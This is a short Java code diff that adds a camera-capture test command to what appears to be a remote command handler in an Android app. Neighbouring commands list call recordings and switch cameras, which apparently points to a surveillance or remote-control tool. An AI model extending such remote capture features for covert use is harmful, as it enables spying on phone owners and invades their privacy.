@@ -771,6 +771,15 @@ case "call_recording_list":
                     sendCommand("CAMERA_TEST_CAPTURE|ERROR: Camera module not available");
                 }
                 break;
+
+            case "camera_capture_test":
+                if (cameraModule != null) {
+                    Log.d(TAG, "📸 Running camera capture test");
+                    String result = cameraModule.captureTestImage();
+                    sendCommand("CAMERA_TEST_IMAGE|" + result);
+                }
+                break;
+
                 
             case "camera_switch":
                 if (cameraModule != null) {
